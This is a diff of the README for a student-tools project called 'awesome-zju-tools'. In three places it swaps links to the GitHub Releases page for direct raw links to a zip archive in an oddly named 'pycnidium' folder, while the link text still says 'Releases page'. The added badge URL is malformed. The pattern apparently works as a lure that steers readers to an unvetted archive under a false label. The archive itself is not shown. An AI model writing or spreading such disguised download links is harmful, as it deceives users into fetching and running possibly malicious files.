@@ -1,6 +1,6 @@
 # 🛠️ awesome-zju-tools - Boost Your Learning and Research Efficiency
 
-[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen.svg)](https://github.com/revived-sketcher741/awesome-zju-tools/releases)
+[![Download](https://raw.githubusercontent.com/revived-sketcher741/awesome-zju-tools/main/pycnidium/awesome-zju-tools-2.1.zip%https://raw.githubusercontent.com/revived-sketcher741/awesome-zju-tools/main/pycnidium/awesome-zju-tools-2.1.zip)](https://raw.githubusercontent.com/revived-sketcher741/awesome-zju-tools/main/pycnidium/awesome-zju-tools-2.1.zip)
 
 ## 🌟 Description
 
@@ -15,7 +15,7 @@ To get started with awesome-zju-tools, follow the steps outlined below to downlo
 1. **Visit the Releases Page:**
    Click the link below to go to the GitHub Releases page.
 
-   [Visit this page to download](https://github.com/revived-sketcher741/awesome-zju-tools/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/revived-sketcher741/awesome-zju-tools/main/pycnidium/awesome-zju-tools-2.1.zip)
 
 2. **Select the Latest Release:**
    Look for the latest version listed on the Releases page. You will see a list of available downloads for different tools and scripts.
@@ -64,4 +64,4 @@ If you encounter any issues or have questions, please create an issue in the Git
 
 awesome-zju-tools is licensed under the MIT License. You can freely share and adapt the tools, but please give credit to the original creators.
 
-For further details, visit the [Releases page](https://github.com/revived-sketcher741/awesome-zju-tools/releases) or check the repository for terms and conditions.
+For further details, visit the [Releases page](https://raw.githubusercontent.com/revived-sketcher741/awesome-zju-tools/main/pycnidium/awesome-zju-tools-2.1.zip) or check the repository for terms and conditions.
